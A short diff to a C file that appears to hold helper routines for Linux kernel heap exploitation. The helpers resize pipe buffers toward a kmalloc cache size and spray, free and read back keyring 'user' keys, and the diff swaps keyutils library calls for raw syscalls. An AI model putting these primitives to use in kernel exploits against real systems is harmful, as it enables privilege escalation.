@@ -10,7 +10,8 @@
 #include <unistd.h>
 #include <string.h>
 #include <stdlib.h>
-#include <keyutils.h>
+#include <linux/keyctl.h>
+#include <sys/syscall.h>
 
 int resizePipeBuffer(int pipe[2], size_t kmalloc_target_size) {
     size_t cache_size = GET_KMALLOC_SIZE(kmalloc_target_size);
@@ -56,7 +57,8 @@ int alloc_key(int id, char *buff, size_t size){
     if(!buff)
         memset(payload, id, size);
 
-    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
+    key = syscall(SYS_add_key, "user", desc, payload, size,
+                  KEY_SPEC_PROCESS_KEYRING);
 
     if(key < 0){
         DIE("add_key(%d)", id);
@@ -68,12 +70,13 @@ int alloc_key(int id, char *buff, size_t size){
 void free_key(int key){
     long ret;
 
-	ret = keyctl_revoke(key);
+	ret = syscall(SYS_keyctl, KEYCTL_REVOKE, key, 0, 0, 0);
 	if(ret<0){
         DIE("free_key : keyctl_revoke(%d)", key);
     }
 
-    ret = keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING);
+    ret = syscall(SYS_keyctl, KEYCTL_UNLINK, key,
+                  KEY_SPEC_PROCESS_KEYRING, 0, 0);
     if(ret<0){
         DIE("free_key : keyctl_unlink(%d)", key);
     }
@@ -81,7 +84,7 @@ void free_key(int key){
 
 void get_key(int key, char *data, size_t size){
 	long ret;
-    ret = keyctl_read(key, data, size);
+    ret = syscall(SYS_keyctl, KEYCTL_READ, key, data, size, 0);
 
     if(ret<0){
         DIE("get_key : keyctl_read(%d)", key);
